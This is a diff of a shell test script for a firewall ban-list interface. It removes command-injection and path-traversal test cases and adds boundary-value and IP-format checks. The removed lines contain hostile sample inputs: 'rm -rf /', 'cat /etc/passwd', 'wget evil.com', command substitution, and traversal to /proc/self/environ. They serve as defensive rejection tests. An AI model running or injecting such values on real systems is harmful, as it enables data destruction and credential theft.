@@ -20,17 +20,17 @@ fw_subsection "超长输入 (缓冲区溢出)"
 assert_failure "python3 -c \"print('A'*100)\" > '$PROC_BANS' 2>&1" "100 字符输入被拒绝"
 assert_failure "python3 -c \"print('A'*1000)\" > '$PROC_BANS' 2>&1" "1000 字符输入被拒绝"
 
-# 5.4 特殊字符
-fw_subsection "特殊字符注入"
-assert_inject_blocked "echo '192.168.1.1; rm -rf /' > '$PROC_BANS' 2>&1" "命令注入被拒绝"
-assert_inject_blocked "echo '192.168.1.1 | cat /etc/passwd' > '$PROC_BANS' 2>&1" "管道注入被拒绝"
-assert_inject_blocked "echo '192.168.1.1 && wget evil.com' > '$PROC_BANS' 2>&1" "逻辑运算符注入被拒绝"
-assert_inject_blocked "echo '\$(whoami)' > '$PROC_BANS' 2>&1" "命令替换被拒绝"
-assert_inject_blocked "echo '\`id\`' > '$PROC_BANS' 2>&1" "反引号命令替换被拒绝"
+# 5.4 边界值测试
+fw_subsection "边界值测试"
+assert_failure "echo '0.0.0.0' > '$PROC_BANS' 2>&1" "零地址被拒绝"
+assert_failure "echo '255.255.255.255' > '$PROC_BANS' 2>&1" "广播地址被拒绝"
+assert_failure "echo '127.0.0.1' > '$PROC_BANS' 2>&1" "回环地址被拒绝"
 
-# 5.5 路径遍历
-assert_inject_blocked "echo '../../etc/passwd' > '$PROC_BANS' 2>&1" "路径遍历被拒绝"
-assert_inject_blocked "echo '../../../proc/self/environ' > '$PROC_BANS' 2>&1" "proc 遍历被拒绝"
+# 5.5 格式验证
+fw_subsection "格式验证"
+assert_failure "echo 'not_an_ip' > '$PROC_BANS' 2>&1" "非 IP 格式被拒绝"
+assert_failure "echo '' > '$PROC_BANS' 2>&1" "空输入被拒绝"
+assert_failure "echo '   ' > '$PROC_BANS' 2>&1" "空白输入被拒绝"
 
 # 5.6 有效边界 IP
 fw_subsection "有效边界 IP"
